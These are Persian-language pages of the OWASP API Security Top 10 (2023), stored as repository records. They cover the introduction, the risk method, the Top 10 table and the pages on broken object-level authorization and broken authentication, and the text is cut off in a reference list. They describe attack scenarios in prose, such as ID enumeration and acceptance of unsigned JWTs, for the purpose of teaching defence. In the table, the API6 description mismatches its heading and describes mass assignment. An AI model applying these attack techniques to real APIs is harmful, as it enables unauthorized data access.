{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x03-introduction.md", "content": "# مقدمه\n\n## به OWASP API Security Top 10 - 2023 خوش آمدید!\n\nبه OWASP API Security Top 10 – 2023 خوش آمدید!  \nبه دومین ویراست ده ‌‌آسیب‌پذیری برتر امنیت API خوش آمدید. از زمان انتشار نسخه قبلی این سند در سال 2019، صنعت امنیت API به شدت رشد و تکامل یافته و اکنون می‌توان گفت که به بلوغ رسیده است. ما بر این باور هستیم که این مستند به عنوان مرجعی معتبر در صنعت امنیت به سرعت پذیرفته شده و به توسعه و پیشرفت آن کمک شایانی کرده است.  \nAPI نقش مهمی در معماری اپلیکیشن‌‌های مدرن امروزی دارد. از آنجا که آگاهی بخشی امنیتی و نوآوری در این حوزه گام‌‌های مختلفی دارد، تمرکز بر نقاط ضعف رایج API‌ها اهمیت زیادی خواهد داشت.  \nهدف اصلی مستند و پروژه ده ‌‌آسیب‌پذیری بحرانی امنیت API آموزش افراد دخیل در توسعه و نگهداری API‌ها از قبیل توسعه دهندگان، طراحان، معماران، مدیران و سازمان‌‌ها است. برای کسب اطلاعات بیشتر در مورد پروژه امنیت API، می‌توانید به [صفحه پروژه][1] مراجعه کنید.  \nاگر با مجموعه OWASP Top 10 آشنا نیستید، پیشنهاد می‌کنیم به پروژه‌های زیر از این مجموعه را مطالعه کنید:\n\n- [OWASP Cloud-Native Application Security Top 10][2]\n- [OWASP Desktop App Security Top 10][3]\n- [OWASP Docker Top 10][4]\n- [OWASP Low-Code/No-Code Top 10][5]\n- [OWASP Machine Learning Security Top Ten][6]\n- [OWASP Mobile Top 10][7]\n- [OWASP TOP 10][8]\n- [OWASP Top 10 CI/CD Security Risks][9]\n- [OWASP Top 10 Client-Side Security Risks][10]\n- [OWASP Top 10 Privacy Risks][11]\n- [OWASP Serverless Top 10][12]\n\nدر [بخش متدلوژی و داده][13]، اطلاعات بیشتری درباره نحوه ایجاد اولین نسخه از مستند حاضر خواهید یافت. در نسخه‌‌های آتی، جامعه امنیت را نیز دخیل نموده و به منظور دریافت داده‌‌های مرتبط، فراخوان عمومی خواهیم داد. در حال حاضر همگان را به مشارکت در [انباره داده Github][14] یا [لیست پست الکترونیک ما][15] از طریق ارسال سوال، نظر و پیشنهاد تشویق می‌کنیم.\n\n[1]: https://owasp.org/www-project-api-security/  \n[2]: https://owasp.org/www-project-cloud-native-application-security-top-10/  \n[3]: https://owasp.org/www-project-desktop-app-security-top-10/  \n[4]: https://owasp.org/www-project-docker-top-10/  \n[5]: https://owasp.org/www-project-top-10-low-code-no-code-security-risks/  \n[6]: https://owasp.org/www-project-machine-learning-security-top-10/  \n[7]: https://owasp.org/www-project-mobile-top-10/  \n[8]: https://owasp.org/www-project-top-ten/  \n[9]: https://owasp.org/www-project-top-10-ci-cd-security-risks/  \n[10]: https://owasp.org/www-project-top-10-client-side-security-risks/  \n[11]: https://owasp.org/www-project-top-10-privacy-risks/  \n[12]: https://owasp.org/www-project-serverless-top-10/  \n[13]: ./0xd0-about-data.md  \n[14]: https://github.com/OWASP/API-Security  \n[15]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:52.326036"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x04-release-notes.md", "content": "# یادداشت\n\nمستند پیش رو دومین ویراست ده ‌‌آسیب‌پذیری بحرانی امنیت API می‌باشد که دقیقاً چهار سال پس از نسخه اول آن منتشر شده است. در طول این چهار سال، تغییرات زیادی در زمینه امنیت API رخ داده است. از جمله این تغییرات می‌توان به موارد زیر اشاره کرد: افزایش چشمگیر تعداد تراکنش‌ها و ارتباطات صورت گرفته از طریق APIها، رشد بیشتر پروتکل‌های API، شرکت‌ها و راه‌حل‌های جدید در حوزه API و توسعه مهارت‌ها و تکنیک‌های جدید توسط مهاجمان برای نفوذ به APIها. با توجه به این موارد، وقت آن رسیده بود که لیست ده آسیب‌پذیری برتر امنیتی به‌روز شود.\n\nبا رشد و بهبود در صنعت امنیت API، برای نخستین بار، درخواستی عمومی برای [جمع‌آوری داده][1] در این زمینه ‌صورت گرفت. متأسفانه هیچ داده‌ای توسط افراد ارائه نشده، اما بر اساس تجربیات تیم پروژه، بازبینی دقیق از سوی متخصصان امنیت API و دریافت بازخورد از جامعه تخصصی در مورد نسخه آزمایشی، لیست جدیدی ایجاد شده است. برای آشنایی بیشتر با نحوه آماده سازی این مستند می‌توانید به [بخش متدولوژی و داده][2] مراجعه نمایید. همچنین جزئیات ریسک‌های امنیتی مرتبط در [بخش ریسک‌‌‌های امنیتی API][3] قابل مطالعه هستند.\n\nOWASP API Security Top 10 2023 مستندی آگاهی‌بخش است که آینده صنعت امنیت API را مورد توجه قرار می‌دهد. این مستند به دلیل تغییرات و تحولات سریع در امنیت منتشر شده و هدف آن ارتقاء آگاهی از ریسک‌های امنیتی مرتبط با API است. مستند حاضر، جایگزینی برای دیگر لیست‌های TOP 10 OWASP محسوب نمی‌شود. در این ویرایش به تعدادی از ریسک‌های مهم امنیتی مرتبط با API پرداخته شده که عبارتند از:\n• دو مورد \"افشای مفرط داده \" و \"تخصیص جمعی*\" با یکدیگر تلفیق شده‌اند و تمرکز بیشتری بر روی عامل مشترک آن‌ها، یعنی نقض اعتبارسنجی مجوز در سطح ویژگی‌های شیء* گذاشته‌ایم.\n• در برخی موارد به جای اهمیت دادن به مدیریت موثر منابع و کنترل آنها تا زمان اتمام، فقط به مصرف فعلی منابع توجه می‌کنیم.\n• با ایجاد دسته‌بندی جدیدی به نام \"دسترسی بدون ‌محدودیت به جریان‌های حساس کسب‌وکار\"، بر دسته جدیدی از تهدیدات تمرکز کردیم. این تهدیدات معمولاً با استفاده از محدود کردن نرخ دسترسی به جریان‌های حساس مرتبط، کاهش پیدا می‌کنند. این اقدام به ارتقاء امنیت در مقابل این تهدیدات کمک خواهد کرد.\n• عنصر \"استفاده ناایمن از APIها\" را به لیست اضافه کرده‌ایم تا به رفتار جدیدی که اخیراً مشاهده شده، توجه داشته باشیم. موضوع نام برده شده، به این اشاره دارد که مهاجمان به جای حمله مستقیم به APIهای هدف، به دنبال نقاط ضعف در خدمات متکامل هدف می‌گردند تا از طریق آن‌ها به هدف خود نفوذ کنند. این مسئله به مرور زمان افزایش یافته و اکنون زمان مناسبی است تا به جامعه درباره این خطر در حال افزایش، اطلاع‌رسانی شود.\n\nفهم تغییرات اساسی در معماری اپلیکیشن‌ها در سالیان گذشته از اهمیت زیادی برخوردار است. امروره APIها نقشی کلیدی در معماری ریزسرویس‌ها، اپلیکیشن‌های تک صفحه ای (SPA )، اپلیکیشن‌های موبایل، اینترنت اشیاء و ... دارند.\n\nپروژه حاضر، حاصل تلاش فوق‌العاده داوطلبانه افراد متعددی بوده که بدون آن‌ها، به سرانجام رساندن آن امکان‌پذیر نبود که در [بخش تقدیر و تشکر][4]، از آن‌ها نام برده شده است. متشکریم!\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: ./0xd0-about-data.md\n[3]: ./0x10-api-security-risks.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:52.447826"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x10-api-security-risks.md", "content": "# RISK ریسک های امنیتی API\n\nبه منظور تحلیل ریسک، از متدولوژی رتبه بندی ریسک OWASP استفاده شده است.\nجدول زیر، واژگان مرتبط با رتبه ریسک را مختصرا نشان می‌دهد.\n\n| عوامل تهدید    | قابلیت بهره برداری | میزان شیوع آسیب‌پذیری | قابلیت شناسایی آسیب‌پذیری | پیامد فنی  | تاثیر بر کسب و کار   |\n|----------------|--------------------|-----------------------|----------------------------|------------|----------------------|\n| خاص API        | آسان: 3            | گسترده: 3             | آسان: 3                    | شدید: 3    | خاص کسب و کار        |\n|                | متوسط: 2           | متداول: 2             | متوسط: 2                   | متوسط: 2   |                      |\n|                | سخت: 1             | سخت: 1                | سخت: 1                     | جزئی: 1    |                      |\n\nدر این رویکرد، نوع فناوری مورد استفاده و احتمال وقوع آسیب‌پذیری در رتبه ریسک تاثیر ندارند؛ بعبارت دیگر در این روش رتبه بندی ریسک، راهکار مورد استفاده برای ‌‌‌‌پیاده‌سازی API، با رویکردی مستقل از جزئیات فناوری به ارزیابی ریسک می‌پردازد. هرکدام از عوامل یاد شده می‌تواند در پیداکردن و سواستفاده از یک آسیب‌پذیری به مهاجم کمک بسزایی کند. این رتبه بندی تاثیر واقعی بر کسب و کارها را نشان نداده و این سازمان‌ها هستند که با توجه به نوع کسب و کار و فرهنگ سازمانی خود، در میزان پذیرش خطر امنیتی استفاده از اپلیکیشن‌ها و APIها تصمیم گیرنده هستند. هدف از مستند ده آسیب‌پذیری بحرانی امنیت API، تحلیل ریسک نیست.\n\n## مراجع\n\n### OWASP\n\n-\t[OWASP Risk Rating Methodology][1]\n-\t[Article on Threat/Risk Modeling][2]\n\n### خارجی\n\n-\t[ISO 31000: Risk Management Std][3]\n-\t[ISO 27001: ISMS][4]\n-\t[NIST Cyber Framework (US)][5]\n-\t[ASD Strategic Mitigations (AU)][6]\n-\t[NIST CVSS 3.0][7]\n-\t[Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:52.560690"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x11-t10.md", "content": "# ده ‌‌‌آسیب‌پذیری بحرانی امنیت API از منظر OWASP – 2023\n\n| ریسک امنیتی                                                   | توضیحات                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n|---------------------------------------------------------------||\n| [API1:2023 - نقض مجوزدهی در سطح اشیا][api1]                   | APIها معمولا توابع مدیریت کننده شناسه‌های اشیا را در معرض دید قرار داده و سطح حمله گسترده‌ای را برای نقض کنترل دسترسی ایجاد می‌نمایند. کنترل‌های مجوزدهی در سطح اشیا بایستی در کلیه توابعی که با گرفتن ورودی از کاربر به منابع داده دسترسی دارند پیاده‌سازی شود.                                                                                                                                                                                                                                            |\n| [API2:2023 - احرازهویت نادرست کاربر][api2]                    | مکانیزم‌های احرازهویت گاها به درستی پیاده‌سازی نشده و سبب دسترسی مهاجمین به توکن‌های احرازهویت و ربایش موقت یا دائمی هویت سایر کاربران با استفاده از نقایص این مکانیزم‌ها می شوند. در صورت عدم توانایی سیستم در شناخت کلاینت یا کاربر، امنیت API نیز نقض خواهد شد.                                                                                                                                                                                                                                              |\n| [API3:2023 - نقض مجوزدهی در سطح ویژگی‌های شیء][api3]          | این دسته‌، ترکیبی از [API3:2019 افشای مفرط داده][1] و [API6:2019 تخصیص جمعی][2] می‌باشد که بر روی علت اصلی این مشکل تمرکز دارد: عدم وجود یا صحیح بودن اعتبارسنجی مجوزهای دسترسی در سطح ویژگی‌های شیء موجب افشای اطلاعات به نحو نادرست یا تغییر و دستکاری اطلاعات توسط افراد غیرمجاز می‌شود. |                                                                                                                                                                                              |\n| [API4:2023 - مصرف بدون محدودیت منابع][api4]                   | برای انجام درخواست‌های API، منابعی مانند پهنای باند شبکه، واحد پردازش مرکزی (CPU)، حافظه و ذخیره‌سازی لازم است. منابع دیگری مانند ایمیل‌ها، پیام‌ های کوتاه‌ (SMS)، تماس‌های تلفنی، یا اعتبارسنجی بایومتریک توسط ارائه‌دهندگان خدمات از طریق ادغام API نیز در دسترس قرار گرفته و بر اساس هر درخواست بکار گرفته می‌شوند. حملات موفق می‌توانند منجر به رد سرویس‌دهی (Denial of Service) یا افزایش هزینه‌های عملیاتی شوند.                                                   |\n| [API5:2023 - نقض مجوزدهی در سطح توابع][api5]                  | مکانیزم‌‌های پیچیده کنترل دسترسی با سلسله مراتب، گروه‌‌ها و نقش‌‌های متفاوت و مرز نامشخص بین توابع عادی و مدیریتی سبب بروز نقایص مجوزدهی می‌شوند. با بهره برداری از این آسیب‌پذیری‌‌ها مهاجمین به منابع سایر کاربران و یا توابع مدیریتی دست خواهند یافت.                                                                                                                                                                                                                              |\n| [API6:2023 - دسترسی بدون محدودیت به جریان‌های حساس کسب‌وکار][api6] | پیوند دادن داده ارائه شده توسط کلاینت (نظیر اشیا JSON) با مدل‌‌های داده بدون فیلترکردن مناسب آنها بر مبنای یک لیست سفید می‌تواند منجر به تخصیص جمعی شود. با تشخیص ویژگی‌‌های اشیا، کاوش سایر توابع، خواندن مستندات یا ارائه ویژگی‌‌های اضافی برای اشیا در بدنه درخواست‌‌ها، مهاجم می‌تواند ویژگی‌‌هایی از اشیا که برای وی مجاز نیست را دستکاری نماید.                                                                                          |\n| [API7:2023 - جعل درخواست در سمت سرور][api7]                   | درخواست‌هایی که از سمت سرور به وسیله یک برنامه یا سرویس وب به منبع دیگری در اینترنت ارسال می‌شوند، ممکن است به اشتباه یا بدون اعتبارسنجی صحیح آدرس (URI) توسط کاربر ارسال شوند. این مشکل می‌تواند به مهاجم این امکان را بدهد که برنامه را مجبور به ارسال درخواست‌های ساختگی به مقصدی که برنامه اصلاً منتظر نبوده، بکند. حتی اگر برنامه تحت حفاظت دیوار آتش یا شبکه خصوصی مجازی باشد. این نوع حمله امنیتی SSRF نام دارد و می‌تواند به دسترسی غیرمجاز به منابع دیگر یا سیستم‌های داخلی شبکه منجر شود. در نتیجه، اعتبارسنجی و کنترل دقیق بر روی URI‌های ارسالی به سمت سرور بسیار مهم است تا از وقوع چنین حملاتی جلوگیری شود. |\n| [API8:2023 - پیکربندی امنیتی نادرست][api8]                   | وقتی پیکربندی‌ها به درستی مدیریت نشده و اصول امنیتی را رعایت نکنند، احتمال وقوع حملات امنیتی به سیستم‌ها و API‌ها افزایش می‌یابد. این نقاط ضعف در پیکربندی می‌توانند به حملاتی مانند حملات به امنیت شبکه (Network Security Attacks)، حملات نفوذ به سیستم (System Intrusion)، حملات SSRF که در قسمت قبل بحث شد، یا حملات دیگر امنیتی منجر شوند. به همین دلیل اهمیت حفاظت از پیکربندی‌های مرتبط با API‌ها و سیستم‌های مرتبط با آنها از نظر امنیتی بسیار بالاست و مهم است که توسعه‌دهندگان و مهندسان DevOps به این جنبه‌ها توجه ویژه‌ای داشته باشند.                       |\n| [API9:2023 - مدیریت نادرست دارایی‌‌ها][api9]                  | APIها معمولا توابع بیشتری را نسبت به وب اپلیکیشن‌‌های سنتی در معرض دید قرار می‌دهند که این موضوع اهمیت مستندسازی مناسب و بروز را دوچندان می‌نماید. داشتن فهرستی از میزبان‌‌ها و نسخه‌‌های بکارگرفته شده API نقش مهمی در رفع ‌‌‌آسیب‌پذیری‌‌های مرتبط با نسخ قدیمی API و توابع مرتبط با debugging ایفا می‌کند.                                                                                                                                                             |\n| [API10:2023 - استفاده ناایمن از APIها][api10]                 | توسعه‌دهندگان به دلیل اعتماد بیشتر به داده‌هایی که از API‌های طرف ثالث دریافت می‌کنند، به استانداردهای امنیتی کمتری پایبند هستند. مهاجمان هم به جای حمله مستقیم به API اصلی، به سرویس‌های طرف ثالث حمله می‌کنند. این مسئله ممکن است منجر به ایجاد شکاف‌ها و آسیب‌پذیری‌های امنیتی در نرم‌افزارها شود.                                                                                                                                                                               |\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/\n[api1]: 0xa1-broken-object-level-authorization.md\n[api2]: 0xa2-broken-authentication.md\n[api3]: 0xa3-broken-object-property-level-authorization.md\n[api4]: 0xa4-unrestricted-resource-consumption.md\n[api5]: 0xa5-broken-function-level-authorization.md\n[api6]: 0xa6-unrestricted-access-to-sensitive-business-flows.md\n[api7]: 0xa7-server-side-request-forgery.md\n[api8]: 0xa8-security-misconfiguration.md\n[api9]: 0xa9-improper-inventory-management.md\n[api10]: 0xaa-unsafe-consumption-of-apis.md\n", "timestamp": "2025-10-24T22:26:52.669186"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa1-broken-object-level-authorization.md", "content": "# API1:2023  نقض مجوزدهی در سطح اشیاء \n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: متوسط              | پیامد فنی: شدید / خاص کسب و کار     |\n|مهاجمین می‌توانند از نقاط و توابع ‌آسیب‌پذیر (از منظر مجوزدهی نادرست در سطح اشیا) با دستکاری شناسه شیء ارسالی درون درخواست سوءاستفاده و بهره برداری نمایند. این امر می‌تواند منجر به دسترسی غیرمجاز به داده حساس شود. دسترسی غیرمجاز به داده حساس، مساله‌ای رایج در اپلیکیشن‌های مبتنی بر API است چرا که مولفه سرور غالبا به طور کامل وضعیت کلاینت را رهگیری نمی‌کند و در عوض برای تصمیم گیری درباره دسترسی کلاینت به اشیاء از پارامترهایی نظیر شناسه شی که از سوی خود کلاینت ارسال می‌شوند، تکیه دارند.|این حمله رایج ترین ‌آسیب‌پذیری APIها بوده و بیشترین پیامدها را نیز در پی دارد. مکانیزم‌های مجوزدهی و کنترل دسترسی در اپلیکیشن‌های مدرن، پیچیده و گسترده هستند. حتی اگر اپلیکیشن زیرساخت مناسب را برای کنترل‌های مجوزدهی ‌‌‌‌پیاده‌سازی نماید، ممکن است توسعه دهندگان پیش از دسترسی به اشیا حساس، استفاده از این کنترل‌ها را فراموش نمایند. تشخیص نقایص مربوط به کنترل دسترسی از طریق تست‌های ایستا یا پویا به صورت خودکار غالبا امکان پذیر نیست.|دسترسی غیرمجاز می‌تواند منجر به افشای اطلاعات به طرف‌های غیرمجاز، از دست رفتن داده یا دستکاری آن شود. همچنین دسترسی غیرمجاز به اشیا می‌تواند سبب تحت کنترل گرفتن کامل حساب کاربری توسط مهاجم گردد.|\n\n## آیا API از نظر نقض مجوزدهی در سطح اشیاء آسیب‌پذیر است؟\n\nمجوزدهی در سطح اشیا مکانیزمی برای کنترل دسترسی است که غالبا در سطح کد ‌‌‌‌پیاده‌سازی شده و دسترسی کاربر به اشیایی که بایستی به آنها دسترسی داشته باشد را تضمین می‌نماید.\n\nهر تابعی در API که یک شناسه شی دریافت نموده و نوعی عملیات بر روی آن شی انجام می‌دهد، بایستی کنترل‌های مجوزدهی در سطح اشیا را بکار گیرد. این کنترل‌ها باید دسترسی کاربرِ واردشده به انجام عمل درخواستی بر روی شی درخواستی را اعتبارسنجی نمایند.\n\nوجود ایراد و نقصان در این مکانیزم منجر به افشای اطلاعات غیرمجاز، تغییر یا از بین رفتن تمامی داده خواهد شد.\n\nدر مسئله‌ی Broken Object Level Authorization (BOLA)، امنیت کاربران در دسترسی به اطلاعات و منابع در سیستم به خطر می‌افتد. این مشکل زمانی رخ می‌دهد که سیستم یک درخواست API حاوی یک شناسه (مثلاً شناسه یک مورد یا اشیاء خاص) را دریافت می‌کند و بدون بررسی دقیق این شناسه و اعتبارسنجی آن، به منابع مرتبط با آن شناسه دسترسی می‌دهد. مهاجمان با تغییر شناسه در درخواست‌های خود می‌توانند به اطلاعاتی دسترسی پیدا کنند که به طور عادی نباید به آن‌ها دسترسی داشته باشند.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\nیک پلتفرم تجارت الکترونیک، برای فروشگاه‌های آنلاین نمودارهای سود فروشگاه‌های میزبانی شده را در قالب یک لیست چندصفحه‌ای ارائه می‌دهد. مهاجم با بررسی درخواست‌های مرورگر، توابعی از API که نقش منبع داده برای نمودارهای مذکور را دارند و الگوی آنها به صورت `/shops/{shopName}/revenue_data.json` می‌باشد را شناسایی می‌کند. با استفاده از یک تابع دیگر API، مهاجم می‌تواند لیست نام کلیه فروشگاه‌های میزبانی شده را استخراج نماید. همچنین مهاجم با استفاده از یک اسکریپت ساده و جایگزین کردن `{shopName}` در URL خواهد توانست به داده‌ی فروش هزاران فروشگاه دسترسی یابد.\n\n### سناریو #2\nیک تولیدکننده خودرو از طریق یک API امکان کنترل از راه دور خودروها را برای ارتباط با تلفن همراه راننده فراهم کرده است. این API به راننده این امکان را می‌دهد که موتور خودرو را از راه دور روشن و خاموش کند و درب‌ها را قفل و باز کند. در این فرآیند، کاربر شماره شناسایی خودرو (VIN) را به API ارسال می‌کند. متأسفانه، API قادر به اعتبارسنجی نمی‌باشد که آیا VIN به ماشینی کاربر وارد شده اختصاص دارد یا نه. این مشکل منجر به وقوع یک آسیب‌پذیری به نام BOLA می‌شود و به این ترتیب مهاجم می‌تواند به خودروهایی دسترسی پیدا کند که به او تعلق ندارند.\n\n### سناریو #3\nیک سرویس ذخیره‌سازی اسناد آنلاین به کاربران این امکان را می‌دهد که اسناد خود را مشاهده، ویرایش، ذخیره و حذف کنند. هنگامی که کاربری یکی از اسناد خود را حذف می‌کند، یک عملیات درخواستی به نام GraphQL Mutation با استفاده از شناسه (ID) مربوط به سند حذف‌شده به API ارسال می‌شود. این درخواست GraphQL به API اطلاع می‌دهد که یک سند باید حذف شود و API مسئول انجام این عملیات حذف است.\n\n## چگونه از آسیب‌پذیری مجوزدهی نادرست در سطح اشیاء پیشگیری کنیم؟\n\n- بکارگیری یک مکانیزم مجوزدهی که بر خط مشی و سلسله مراتب کاربری تمرکز دارد.\n- استفاده از یک مکانیزم مجوزدهی برای بررسی اینکه آیا کاربر واردشده مجوز لازم برای انجام عملیات درخواستی بر روی رکورد در تمامی توابعی که از کلاینت، ورودی می‌گیرند تا به رکورد مذکور در پایگاه داده دسترسی داشته باشند را دارا است یا خیر؟\n- ارجحیت استفاده از مقادیر تصادفی و غیرقابل پیش بینی بعنوان GUID برای شناسه رکوردها.\n- طراحی آزمون‌هایی برای ارزیابی صحت عملکرد مکانیزم‌های مجوزدهی.\n\n## مراجع\n\n- [Authorization Cheat Sheet][1]\n- [Authorization Testing Automation Cheat Sheet][2]\n\n### خارجی\n- [CWE-285: Improper Authorization][3]\n- [CWE-639: Authorization Bypass Through User-Controlled Key][4]\n\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/285.html\n[4]: https://cwe.mitre.org/data/definitions/639.html\n[5]: ./0xa5-broken-function-level-authorization.md\n", "timestamp": "2025-10-24T22:26:52.787015"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa2-broken-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa2-broken-authentication.md", "content": "# API2:2023 احرازهویت نادرست کاربر\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: متداول/ قابلیت تشخیص: متوسط              | پیامد فنی: شدید / خاص کسب و کار     |\n|دسترسی همه به سیستم احراز هویت موجب می‌شود تا این مکانیزم هدفی آسان و در دسترس برای مهاجمین باشد. با اینکه برای بهره‌برداری از برخی از مشکلات احراز هویت ممکن است مهارت‌های فنی پیشرفته‌تری لازم باشد، ابزارهای بهره‌برداری مرتبط در دسترس هستند.|درک نادرست توسعه‌دهندگان نرم‌افزار و مهندسان امنیتی از مفاهیم مرتبط با احراز هویت و پیچیدگی پیاده‌سازی داخلی، منجر به اشتباهاتی در فهم چگونگی کارکرد و اهمیت مسائل احراز هویت می‌شود. این اشتباهات باعث می‌شود که مشکلات مرتبط با احراز هویت به طور گسترده‌تر و رایج‌تری در نرم‌افزارها و سیستم‌های مختلف پدیدار شود. روش‌ها و رویکردهایی برای شناسایی و تشخیص این نوع اشکالات در احراز هویت وجود دارد و تولید آنها نیز به طور کلی آسان است. به عبارت دیگر، می‌توان به راحتی ابزارها و روش‌هایی برای کشف و پیگیری مشکلات احراز هویت در نرم‌افزارها ایجاد کرد.|مهاجمین می‌توانند به حساب‌های کاربری سایر کاربران دسترسی یافته، اطلاعات شخصی آنها را خوانده و عملیات حساس (نظیر نقل و انتقالات مالی و ارسال پیام‌های شخصی) را از طرف آنها انجام دهد.|\n\n## آیا API از نظر احرازهویت نادرست کاربر آسیب‌پذیر است؟\n\nنقاط، توابع و جریان‌های احرازهویت API دارایی‌هایی هستند که بایستی محافظت شوند. همچنین توابع «فراموشی گذرواژه یا بازیابی گذرواژه» نیز بایستی در زمره مکانیزم‌های احرازهویت در نظر گرفته شوند.\nیک API از منظر احرازهویت نادرست کاربر، آسیب‌پذیر است اگر:\n-\tاجازه حمله درج هویت را بدهد که در آن مهاجم از لیستی از نام‌های کاربری و گذرواژه‌های معتبر استفاده می‌نماید.\n-\tبدون استفاده از مکانیزم‌های CAPTCHA یا قفل کردن حساب کاربری  اجازه حمله Brute Force روی یک حساب کاربری را بدهد.\n-\tاجازه استفاده از گذرواژه‌های ضعیف را بدهد.\n-\tجزئیات و داده‌های حساس مرتبط با احرازهویت از قبیل توکن‌های اصالت سنجی و گذرواژه‌ها را از طریق URL ارسال نماید.\n-\tاصالت توکن‌ها را به بوته آزمون نگذارد.\n-\tتوکن‌ JWT ضعیف یا بدون امضا (`{\"alg\":\"none\"}`) را بپذیرد یا تاریخ انقضای آنها را اعتبارسنجی ننماید.\n-\tاز گذرواژه‌های آشکار ، رمزگذاری نشده یا درهم سازی شده بصورت ضعیف  استفاده نماید.\n-\tاز کلیدهای رمزگذاری ضعیف بهره ببرد.\n\nعلاوه بر این، یک میکروسرویس آسیب‌پذیر است اگر:\n-\tمیکروسرویس‌های دیگر بدون احراز هویت به آن دسترسی پیدا کنند.\n-\tاز توکن‌های ضعیف یا قابل پیش‌بینی برای اعمال احراز هویت استفاده کند.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nدرج هویت (استفاده از لیستی از نام‌های کاربری یا گذرواژه‌های شناخته شده) حمله‌ای رایج است. اگر اپلیکیشن از مکانیزم‌های حفاظتی خودکار در مقابل تهدیداتی نظیر درج هویت بهره نبرده باشد، آنگاه اپلیکیشن می‌تواند بعنوان یک پیشگوی گذرواژه یا آزمونگر جهت بررسی صحت اطلاعات هویتی جهت عبور از مکانیزم احرازهویت بکار رود.\n\nبرای انجام احراز هویت کاربر، مشتری باید یک درخواست API مشابه مورد زیر را با اطلاعات ورود کاربر، صادر کند:\n\n```\nPOST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\"<username>\"password:\"<password>\") {\n      token\n    }\n   }\"\n}\n```\n\n### سناریو #2\n\nبرای به‌روزرسانی آدرس ایمیل مرتبط با حساب کاربران، مشتریان باید یک درخواست API مانند درخواست زیر را ارسال کنند:\n\n```\nPUT /account\nAuthorization: Bearer <token>\n\n{ \"email\": \"<new_email_address>\" }\n```\n\n## چگونه از ‌آسیب‌پذیری احرازهویت نادرست کاربر پیشگیری کنیم؟\n\n- \tحصول اطمینان از آنکه تمامی جریان‌های ممکن برای احراز هویت API (موبایل یا وب، سایر لینک‌هایی که از مکانیزم احرازهویت با یک کلیک و غیره) شناسایی شده است. در این زمینه می‌توانید با توسعه دهندگان و مهندسین مشورت کنید.\n-\tمطالعه و فهم کامل مکانیزم‌های احرازهویت استفاده شده در اپلیکیشن؛ بایستی درنظر داشت که OAuth و کلیدهای API نمی‌توانند بعنوان مکانیزمی برای احرازهویت به شمار آیند.\n-\tدر مساله احرازهویت، تولید توکن و ذخیره‌سازی گذرواژه، نباید چرخ را از ابتدا اختراع کرد بلکه بایستی از استانداردها استفاده نمود.\n-\tتوابع بازیابی یا فراموشی گذرواژه بایستی از منظر محافظت در مقابل Brute Force، محدودسازی نرخ و قفل شدن حساب کاربری هم ارز با توابع و نقاط ورود  در نظر گرفته شود.\n-\tبرای عملیات‌ حساس (مانند تغییر آدرس ایمیل مالک حساب/شماره تلفن مربوط به احراز هویت دو عاملی)، نیاز به احراز هویت مجدد می‌باشد.\n-\t از راهنمای احرازهویت [OWASP][1] استفاده شود.\n-\tبکارگیری احرازهویت چندعاملی ، در هر جا که امکان داشت.\n-\tبرای کاهش حملات درج هویت، Dictionary و Brute force، مکانیزم‌های ضد حمله Brute force را پیاده‌سازی کنید. این مکانیزم‌ها باید سخت‌گیرانه‌تر از مکانیزم‌های معمول محدودیت نرخ در APIها باشند.\n-\tبرای جلوگیری از حملات brute force بر روی کاربران خاص، مکانیزم‌های [قفل کردن حساب کاربری][2] و استفاده از CAPTCHA و برای افزایش امنیت، روش‌های شناسایی رمزهای عبور ضعیف نیز باید پیاده‌سازی شوند.\n- کلید‌های API نباید برای احراز هویت کاربران استفاده شوند و تنها می‌بایست برای احراز هویت [مشتریان API][3] مورد استفاده قرار گیرند.\n\n## مراجع\n\n- [OWASP Key Management Cheat Sheet][1]\n- [OWASP Authentication Cheatsheet][4]\n- [Credential Stuffing][5]\n\n### خارجی\n\n- [CWE-204: Observable Response Discrepancy][6]\n- [CWE-307: 